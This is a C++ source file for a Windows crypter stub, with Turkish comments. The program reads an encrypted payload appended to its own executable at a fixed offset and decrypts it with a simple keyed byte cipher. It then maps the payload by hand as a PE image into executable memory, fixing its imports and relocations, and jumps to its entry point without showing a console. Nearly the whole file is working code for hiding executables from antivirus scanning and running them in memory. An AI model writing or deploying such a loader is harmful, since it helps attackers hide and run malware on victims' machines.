#include <iostream> // Standard C++ library for console I/O
#include <string> // Standard C++ Library for string manip
#include <fstream>
#include <sstream>

#include <Windows.h> // WinAPI Header
#include <TlHelp32.h> //WinAPI Process API
#include "agent.h"
#include <iomanip>

void WriteFile(const std::string& filePath, const unsigned char* content, std::size_t size);
unsigned char* ReadFile(const std::string& filePath, std::streampos& fileSize);
unsigned char* ReadFileFromOffset(const std::string& filePath, std::size_t offset, std::size_t& dataSize);

int CopyImports(IMAGE_IMPORT_DESCRIPTOR* imp_desc, void* load_address);
void* MapModuleInMemory(void* rawData);

char M0rCryptByte(char plainByte, const char* inputKey, std::size_t size);
unsigned char* M0rCryptData(unsigned char* plainData, std::size_t size, const char* inputKey, std::size_t keySize);
char De_M0rCryptByte(char plainByte, const char* inputKey, std::size_t size);
unsigned char* De_M0rCryptData(unsigned char* plainData, std::size_t size, const char* inputKey, std::size_t keySize);

unsigned char decryptionKey[101] = "c";

int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow)
{
	//AllocConsole();
	//freopen("CONOUT$", "w", stdout);
	//freopen("CONIN$", "r", stdin);

	HMODULE hModule = GetModuleHandle(NULL); // Mevcut modülün tanıtıcısını alır
	char dosyaAdi[MAX_PATH];
	GetModuleFileName(hModule, dosyaAdi, MAX_PATH);

	std::size_t filesize;
	unsigned char* bytes = ReadFileFromOffset(dosyaAdi, 0x5A00, filesize);
	unsigned char* decryptedBytes = De_M0rCryptData(bytes, filesize, (char*)decryptionKey, strlen((char*)decryptionKey));
	
	void* OEP = MapModuleInMemory(decryptedBytes);
	(*(void(*)())(OEP))();

	return 0;
}

unsigned char* ReadFile(const std::string& filePath, std::streampos& fileSize)
{
	std::ifstream file(filePath, std::ios::binary | std::ios::ate);

	if (!file)
	{
		return nullptr;
	}

	fileSize = file.tellg(); // Dosya boyutunu al

	unsigned char* fileContent = new unsigned char[fileSize]; // Dosya boyutu kadar bellek tahsis et

	file.seekg(0, std::ios::beg); // Dosyanın başına git
	file.read(reinterpret_cast<char*>(fileContent), fileSize); // Dosya içeriğini oku

	return fileContent;
}

void WriteFile(const std::string& filePath, const unsigned char* content, std::size_t size)
{
	std::ofstream file(filePath, std::ios::binary);

	if (!file)
	{
		return;
	}

	file.write(reinterpret_cast<const char*>(content), size);
}

unsigned char* ReadFileFromOffset(const std::string& filePath, std::size_t offset, std::size_t& dataSize)
{
	std::ifstream file(filePath, std::ios::binary);

	if (!file)
	{
		return nullptr;
	}

	file.seekg(offset, std::ios::beg); // Belirtilen ofsete dosya konumunu ayarlayın

	std::size_t fileSize = static_cast<std::size_t>(file.seekg(0, std::ios::end).tellg()); // Dosya boyutunu alın
	std::size_t remainingSize = fileSize - offset; // Geriye kalan verinin boyutunu hesaplayın

	unsigned char* content = new unsigned char[remainingSize]; // Bellekte yer ayırın

	file.seekg(offset, std::ios::beg); // Ofsete geri dönün
	file.read(reinterpret_cast<char*>(content), remainingSize); // Dosyanın geri kalanını okuyun

	dataSize = remainingSize; // Veri boyutunu aktarın

	return content;
}

int CopyImports(IMAGE_IMPORT_DESCRIPTOR* imp_desc, void* load_address)
{
	while (imp_desc->Name || imp_desc->TimeDateStamp) {
		IMAGE_THUNK_DATA* name_table, * address_table, * thunk;
		char* dll_name = (char*)load_address + imp_desc->Name;
		HMODULE module = LoadLibraryA(dll_name);
		if (!module) {
			return 0;
		}
		name_table = (IMAGE_THUNK_DATA*)((char*)load_address + imp_desc->OriginalFirstThunk);
		address_table = (IMAGE_THUNK_DATA*)((char*)load_address + imp_desc->FirstThunk);

		thunk = name_table == load_address ? address_table : name_table;
		if (thunk == load_address)
			return 0;
		while (thunk->u1.AddressOfData) {
			char* func_name;
			// is ordinal or no
			if (thunk->u1.Ordinal & IMAGE_ORDINAL_FLAG)
				func_name = (char*)(thunk->u1.Ordinal & 0xffff);
			else
				func_name = ((IMAGE_IMPORT_BY_NAME*)((char*)load_address + thunk->u1.AddressOfData))->Name;
			address_table->u1.Function = (DWORD)GetProcAddress(module, (char*)func_name);
			thunk++;
			address_table++;
		}
		imp_desc++;
	}
	return 1;
}

void* MapModuleInMemory(void* rawData)
{
	IMAGE_DOS_HEADER* DosHeader = (IMAGE_DOS_HEADER*)rawData;
	IMAGE_NT_HEADERS* NtHeader = (IMAGE_NT_HEADERS*)((char*)rawData + DosHeader->e_lfanew);

	// If not having Relocations
	IMAGE_DATA_DIRECTORY* reloc_entry = &NtHeader->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC];
	if (!reloc_entry->VirtualAddress || !reloc_entry->Size)
		return NULL;

	LPVOID outputImage = VirtualAlloc(0, (int)NtHeader->OptionalHeader.SizeOfImage, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
	if (!outputImage)
		return NULL;

	// Copy sections and image...
	IMAGE_SECTION_HEADER* SectionHeader = IMAGE_FIRST_SECTION(NtHeader);
	size_t HeadersSize = (char*)(SectionHeader + NtHeader->FileHeader.NumberOfSections) - (char*)rawData;
	memcpy(outputImage, rawData, HeadersSize);
	for (int i = 0; i < NtHeader->FileHeader.NumberOfSections; i++)
		memcpy((char*)outputImage + SectionHeader[i].VirtualAddress, (char*)rawData + SectionHeader[i].PointerToRawData, SectionHeader[i].SizeOfRawData);


	// Copy IAT (Import Address Table)
	IMAGE_DATA_DIRECTORY* imp_entry = &NtHeader->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT];
	IMAGE_IMPORT_DESCRIPTOR* ImportDesc = (IMAGE_IMPORT_DESCRIPTOR*)((char*)outputImage + imp_entry->VirtualAddress);
	if (!CopyImports(ImportDesc, outputImage)) {
		VirtualFree(outputImage, 0, MEM_RELEASE);
		return NULL;
	}

	// Fix relocations (need .reloc section)
	IMAGE_BASE_RELOCATION* BaseRelocation = (IMAGE_BASE_RELOCATION*)((char*)outputImage + reloc_entry->VirtualAddress);
	IMAGE_BASE_RELOCATION* CurReloc = BaseRelocation, * reloc_end;
	DWORD DeltaImageBase = (DWORD)outputImage - NtHeader->OptionalHeader.ImageBase;
	reloc_end = (IMAGE_BASE_RELOCATION*)((char*)BaseRelocation + reloc_entry->Size);
	while (CurReloc < reloc_end && CurReloc->VirtualAddress) {
		int count = (CurReloc->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) / sizeof(WORD);
		WORD* CurEntry = (WORD*)(CurReloc + 1);
		void* PageVa = (void*)((char*)(DWORD)outputImage + CurReloc->VirtualAddress);

		while (count--) {
			/* is valid x86 relocation? */
			if (*CurEntry >> 12 == IMAGE_REL_BASED_HIGHLOW)
				*(DWORD*)((char*)PageVa + (*CurEntry & 0x0fff)) += DeltaImageBase;
			CurEntry++;
		}
		/* advance to the next one */
		CurReloc = (IMAGE_BASE_RELOCATION*)((char*)CurReloc + CurReloc->SizeOfBlock);
	}

	return (void*)((char*)outputImage + NtHeader->OptionalHeader.AddressOfEntryPoint);
}

char M0rCryptByte(char plainByte, const char* inputKey, std::size_t size)
{
	for (std::size_t i = 0; i < size; i++)
	{
		if (i % 2 == 0)
		{
			plainByte += static_cast<int>(inputKey[i]);
		}
		else
		{
			plainByte -= static_cast<int>(inputKey[i]);
		}
	}

	return plainByte;
}

unsigned char* M0rCryptData(unsigned char* plainData, std::size_t size, const char* inputKey, std::size_t keySize)
{
	unsigned char* encryptedData = new unsigned char[size];
	std::memcpy(encryptedData, plainData, size);

	for (std::size_t i = 0; i < size; i++)
	{
		encryptedData[i] = M0rCryptByte(encryptedData[i], inputKey, keySize);
	}

	return encryptedData;
}

char De_M0rCryptByte(char plainByte, const char* inputKey, std::size_t size)
{
	for (std::size_t i = 0; i < size; i++)
	{
		if (i % 2 == 0)
		{
			plainByte -= static_cast<int>(inputKey[i]);
		}
		else
		{
			plainByte += static_cast<int>(inputKey[i]);
		}
	}

	return plainByte;
}

unsigned char* De_M0rCryptData(unsigned char* encryptedData, std::size_t size, const char* inputKey, std::size_t keySize)
{
	unsigned char* decryptedData = new unsigned char[size];
	std::memcpy(decryptedData, encryptedData, size);

	for (std::size_t i = 0; i < size; i++)
	{
		decryptedData[i] = De_M0rCryptByte(decryptedData[i], inputKey, keySize);
	}

	return decryptedData;
}